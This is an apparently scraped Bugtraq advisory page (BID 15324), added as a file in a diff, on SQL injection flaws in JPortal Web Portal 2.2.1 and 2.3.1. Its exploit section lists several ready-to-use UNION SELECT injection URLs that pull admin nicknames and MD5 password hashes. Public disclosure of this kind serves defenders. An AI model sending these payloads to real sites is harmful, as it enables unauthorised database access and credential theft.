@@ -1,0 +1,98 @@
+#SpeeDr00t@Black Falcon<br>#bid15324<p><b><span style="font-size: 18pt;">JPortal Multiple SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/15324/info">info</a><br><a href="http://www.securityfocus.com/bid/15324/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/15324/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/15324/solution">solution</a><br><a href="http://www.securityfocus.com/bid/15324/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				15324
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Nov 04 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Nov 04 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				mousehack@gmail.com is credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					JPortal Web Portal 2.3.1 <br/>
+					
+				
+					JPortal Web Portal 2.2.1 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>Example URI have been provided:<br/><br/>http://www.example.com/print.php?what=article&amp;id=&lt;articleid&gt;%20AND%201=0%20UNION%20SELECT%20id,id,nick,pass,id,id,id,id,id%20from%20admins%20LIMIT%201<br/><br/>http://www.example.com/comment.php?what=news&amp;id=&lt;news id&gt;<br/>and 1=0 union (select null, null, nick, null, null, null, null, null, null,<br/>null, null, null from admins limit n,1)<br/>got admin nick<br/><br/>http://www.example.com/comment.php?what=news&amp;id=&lt;news id&gt;<br/>and 1=0 union (select null, null, pass, null, null, null, null, null, null,<br/>null, null, null from admins limit n,1)<br/>got md5 password<br/><br/>http://www.example.com/print.php?what=article&amp;id=&lt;article id&gt; AND 1=0 UNION SELECT id,id,nick,pass,id,id,id,id,id from admins LIMIT 1<br/><br/>http://www.example.com/news.php?id=&lt;newsid&gt;%20AND%200%20=%201%20UNION%20SELECT%20*,%201,%201,%201,%201%20FROM%20admins%20--<br/><br/>http://www.example.com/print.php?what=article&amp;id=&lt;articleid&gt;%20AND%201=0%20UNION%20SELECT%20id,id,nick,pass,id,id,id,id,id%20from%20admins%20LIMIT%201
+	
+		<ul>
+</ul>
+</div>
